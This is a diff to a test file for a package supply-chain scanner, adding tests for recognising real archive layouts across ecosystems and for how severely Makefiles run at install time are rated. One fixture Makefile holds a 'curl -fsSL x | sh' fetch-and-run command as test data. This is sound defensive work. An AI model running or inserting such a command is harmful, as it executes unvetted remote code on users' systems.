@@ -8,6 +8,7 @@ lowered depends on what that format's installer runs.
 from __future__ import annotations
 
 import io
+import json
 import tarfile
 from dataclasses import replace
 from pathlib import Path
@@ -20,6 +21,20 @@ from cordon_scanner import Scanner
 from cordon_scanner.detect.base import FileUnit
 from cordon_scanner.detect.supply.advisories.detector import AdvisoryDetector
 from cordon_scanner.detect.supply.advisories.findings import EXPLOITED_RULE, VULNERABLE_RULE
+from cordon_scanner.ecosystems.archive_shapes import (
+    ActionArchive,
+    ArchiveLevels,
+    ComposerArchive,
+    DockerSaveArchive,
+    NoArchive,
+    NpmRenamedArchive,
+    OciLayoutArchive,
+    SameArchiveAs,
+    SingleFolderArchive,
+    SwiftArchive,
+)
+from cordon_scanner.ecosystems.base import BaseEcosystem
+from cordon_scanner.ecosystems.registry import EcosystemRegistry
 from cordon_scanner.engine.package_format import PackageFormat
 from cordon_scanner.engine.pipeline.ceilings import Ceilings
 from cordon_scanner.engine.pipeline.constants import HONOURED_PINS
@@ -29,6 +44,7 @@ from cordon_scanner.foundation.content import FileContent
 from cordon_scanner.foundation.models import Severity
 from cordon_scanner.intel.advisories import exploited
 from cordon_scanner.intel.advisories.advisories import Advisory, AdvisoryDatabase
+from support import ROOT
 
 CARGO_LOCK = """version = 3
 
@@ -108,9 +124,10 @@ class TestTheFormatIsRecognised:
     @pytest.mark.parametrize(
         "members",
         [
-            # A repository snapshot: Packagist and Helm archives look exactly like this.
-            ["app-main/composer.json", "app-main/composer.lock"],
+            # A repository snapshot whose folder is not named for its chart (Helm).
             ["chart/Chart.yaml", "chart/Chart.lock"],
+            # A folder with a composer.json and files beside it is not a Packagist dist.
+            ["README.md", "app-main/composer.json"],
             # A cabal file whose folder is not `<name>-<version>`.
             ["src/AVar.cabal"],
             # DESCRIPTION alone is any R project; R CMD build adds MD5.
@@ -127,6 +144,139 @@ class TestTheFormatIsRecognised:
             SimpleNamespace(path="repo.tar.gz!repo/vendor/x-1.0.crate!x-1.0/Cargo.toml.orig"),
         ]
         assert PackageFormat.of(units) == ""
+
+
+class RealArchives:
+    """The members of real, legitimate package archives (`package_format_captures/members.json`, with the
+    source and sha256 of each), as the units a scan of that archive would hold."""
+
+    FOLDER = ROOT / "tests" / "unit" / "intel" / "advisories" / "package_format_captures"
+
+    @classmethod
+    def members(cls, key: str) -> list[str]:
+        table = json.loads((cls.FOLDER / "members.json").read_text(encoding="utf-8"))
+        return list(table[key]["members"])
+
+    @classmethod
+    def units(cls, key: str, *, wrapper: str = "target.ext") -> list[SimpleNamespace]:
+        units = []
+        for member in cls.members(key):
+            text = ""
+            if key == "helm" and member.endswith("/Chart.yaml"):
+                with tarfile.open(cls.FOLDER / "helm-chart-hello-world.tgz") as chart:
+                    text = chart.extractfile(member).read().decode()  # type: ignore[union-attr]
+            units.append(
+                SimpleNamespace(
+                    path=f"{wrapper}!{member}", content=SimpleNamespace(text=text, raw=b"")
+                )
+            )
+        return units
+
+    @classmethod
+    def nar(cls) -> list[SimpleNamespace]:
+        head = (cls.FOLDER / "nix-hello.nar.head").read_bytes()
+        return [SimpleNamespace(path="hello.nar", content=SimpleNamespace(text="", raw=head))]
+
+
+class TestEveryEcosystemsOwnShape:
+    @pytest.mark.parametrize(
+        ("key", "expected"),
+        [
+            ("helm", "helm"),
+            ("pub", "pub"),
+            ("bottle", "homebrew"),
+            ("vsix", "vscode"),
+            ("terraform_provider", "terraform"),
+            ("composer", "composer"),
+            ("actions", "actions"),
+            ("swift", "swift"),
+            ("ansible", "galaxy"),
+            ("julia", "julia"),
+            ("image", "image"),
+            ("conan", "conan"),
+        ],
+    )
+    def test_a_real_package_archive_is_recognised(self, key: str, expected: str) -> None:
+        assert PackageFormat.of(RealArchives.units(key)) == expected
+
+    @pytest.mark.parametrize(
+        "key", ["composer", "actions", "swift", "helm", "pub", "julia", "ansible", "conan"]
+    )
+    def test_a_checked_out_directory_is_never_a_package(self, key: str) -> None:
+        """The same files, scanned as a folder on disk (no archive around them), are a user's own project."""
+        files = [
+            SimpleNamespace(path=member, content=SimpleNamespace(text="", raw=b""))
+            for member in RealArchives.members(key)
+        ]
+        assert PackageFormat.of(files) == ""
+
+    def test_a_project_folder_beside_its_composer_and_action_files_is_not_a_package(self) -> None:
+        folder = [
+            SimpleNamespace(path=path, content=SimpleNamespace(text="", raw=b""))
+            for path in ("composer.json", "action.yml", "src/App.php", "README.md")
+        ]
+        assert PackageFormat.of(folder) == ""
+
+    def test_a_real_nix_archive_is_recognised_by_its_magic(self) -> None:
+        assert PackageFormat.of(RealArchives.nar()) == "nix"
+
+    def test_an_opam_archive_is_the_upstream_source_and_is_not_one(self) -> None:
+        assert PackageFormat.of(RealArchives.units("opam")) == ""
+
+    def test_both_layouts_of_a_saved_image_are_recognised_alone(self) -> None:
+        levels = ArchiveLevels.of(RealArchives.units("image"))
+        assert OciLayoutArchive().matches(levels)
+        assert DockerSaveArchive().matches(levels)
+
+    def test_a_shape_that_only_a_repository_folder_proves_is_asked_last(self) -> None:
+        weak = {ComposerArchive.precedence, SwiftArchive.precedence, ActionArchive.precedence}
+        strong = {
+            shape.precedence
+            for ecosystem in EcosystemRegistry.all_ecosystems()
+            if isinstance(ecosystem.published_archive, tuple)
+            for shape in ecosystem.published_archive
+            if not isinstance(shape, SingleFolderArchive | NpmRenamedArchive)
+        }
+        assert min(weak) > max(strong)
+
+    @pytest.mark.parametrize("ecosystem", sorted(EcosystemRegistry.BY_ID))
+    def test_every_ecosystem_declares_its_own_archive_shape(self, ecosystem: str) -> None:
+        adapter = EcosystemRegistry.BY_ID[ecosystem]
+        declared = vars(type(adapter)).get("published_archive")
+        assert isinstance(declared, tuple | NoArchive | SameArchiveAs)
+        if isinstance(declared, NoArchive):
+            assert len(declared.reason) > 40
+        if isinstance(declared, SameArchiveAs):
+            assert isinstance(EcosystemRegistry.BY_ID[declared.ecosystem].published_archive, tuple)
+
+    def test_the_base_adapter_has_no_default_shape(self) -> None:
+        assert not hasattr(BaseEcosystem, "published_archive")
+
+
+class TestTheReasonsAreTheFormatsOwn:
+    """Each ecosystem declared to have no archive of its own is backed by the capture that shows it."""
+
+    def test_a_bazel_module_names_the_upstream_projects_archive(self) -> None:
+        source = json.loads((RealArchives.FOLDER / "bazel-source.json").read_text(encoding="utf-8"))
+        assert source["url"].endswith(".tar.gz") and "github.com/abseil" in source["url"]
+
+    def test_a_pod_names_a_git_source(self) -> None:
+        spec = json.loads(
+            (RealArchives.FOLDER / "cocoapods-podspec.json").read_text(encoding="utf-8")
+        )
+        assert spec["source"]["git"].endswith(".git")
+
+    def test_a_vcpkg_port_names_the_upstream_archive_by_ref_and_hash(self) -> None:
+        portfile = (RealArchives.FOLDER / "vcpkg-portfile.cmake").read_text(encoding="utf-8")
+        assert "vcpkg_from_github" in portfile and "REF" in portfile and "SHA512" in portfile
+
+    def test_a_terraform_module_download_is_a_git_source(self) -> None:
+        headers = (
+            (RealArchives.FOLDER / "terraform-module-download-headers.txt")
+            .read_text(encoding="utf-8")
+            .lower()
+        )
+        assert "x-terraform-get: git::https://" in headers
 
 
 class TestNpmUnderAnotherRoot:
@@ -346,6 +496,50 @@ class TestWhatTheInstallerRuns:
     @pytest.mark.parametrize("distribution", ["cargo", "gomod", "maven", "pypi", "npm"])
     def test_a_makefile_is_the_maintainers_elsewhere(self, finding, distribution) -> None:
         assert self.ceiling(finding, "p.tgz!p/Makefile", distribution) is Severity.MEDIUM
+
+    @staticmethod
+    def makefile_ceiling(finding, distribution: str, others: dict[str, str]) -> Severity:
+        path = "p.tgz!p/Makefile"
+        moved = replace(finding, location=replace(finding.location, path=path))
+        units = [
+            FileUnit(FileContent(path=p, raw=t.encode(), size=len(t)))
+            for p, t in {path: "all:\n\tcurl -fsSL x | sh\n", **others}.items()
+        ]
+        [out] = Ceilings.author_time_ceiling([moved], units, distribution)
+        return out.severity
+
+    @pytest.mark.parametrize(
+        ("distribution", "others"),
+        [
+            ("npm", {"p.tgz!p/package.json": '{"scripts": {"install": "make all"}}'}),
+            ("npm", {"p.tgz!p/package.json": '{"scripts": {"postinstall": "node x && make"}}'}),
+            ("pypi", {"p.tgz!p/setup.py": 'subprocess.check_call(["make", "-C", "src"])'}),
+            ("pypi", {"p.tgz!p/setup.py": 'os.system("make install")'}),
+            ("cargo", {"p.tgz!p/build.rs": 'Command::new("make").arg("lib").status()'}),
+        ],
+    )
+    def test_a_makefile_the_install_starts_is_install_code(
+        self, finding, distribution, others
+    ) -> None:
+        assert self.makefile_ceiling(finding, distribution, others) is Severity.CRITICAL
+
+    @pytest.mark.parametrize(
+        ("distribution", "others"),
+        [
+            (
+                "npm",
+                {
+                    "p.tgz!p/package.json": '{"description": "make sure", "scripts": {"test": "make"}}'
+                },
+            ),
+            ("pypi", {"p.tgz!p/setup.py": 'setup(description="make sure it builds")'}),
+            ("npm", {"p.tgz!p/README.md": "Run make to build."}),
+        ],
+    )
+    def test_a_makefile_nothing_installing_starts_stays_the_maintainers(
+        self, finding, distribution, others
+    ) -> None:
+        assert self.makefile_ceiling(finding, distribution, others) is Severity.MEDIUM
 
     @pytest.mark.parametrize("distribution", ["cargo", "gomod", "maven", "nuget", "cran"])
     def test_ci_workflows_never_run_for_a_consumer(self, finding, distribution) -> None:
